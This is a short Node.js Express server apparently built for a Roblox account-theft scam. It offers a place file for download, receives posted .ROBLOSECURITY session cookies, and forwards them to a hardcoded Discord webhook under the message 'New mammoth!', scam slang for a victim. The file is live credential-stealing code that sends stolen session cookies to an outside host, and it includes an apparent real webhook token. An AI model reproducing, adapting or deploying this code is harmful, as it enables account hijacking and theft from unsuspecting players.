const { table } = require('console');
const express = require('express');
const path = require('path');
const app = express();

const PORT = process.env.PORT || 3000;
app.use(express.static(path.join(__dirname, 'public')));

const webhookUrl = 'https://discord.com/api/webhooks/1519693949214658762/MVHMg0w16OS3IkPVwLODMU2myWyAC5VF86n-L74rmxhtyk-w_jITF7yg_qpXUaXNfsG6';

app.get('/download', async (req, res) => {
  const file = path.join(__dirname, 'public', 'sfa.rbxl'); // <=========================================
  res.download(file);
});

app.post('/send', async (req, res) => {
    let cookies = req.body;
    let index = 0;
    let cookiesArray = []
    for (const cookie in cookies) {
        index++;
        //{"name":"Куки №1","value":"авыпфвы"}
        let newObject = {"name": `Куки №${index}`,"value":`${cookie}`};
        cookiesArray.push(newObject);
    }
    let finalTextalmost = {"content":"Новый мамонт!","embeds":[{"title":"Данные","description":"Файлы .ROBLOSECURITY","color":5814783,"fields":[cookiesArray.concat(", ")]}],"attachments":[]};
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(finalTextalmost)
    });
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
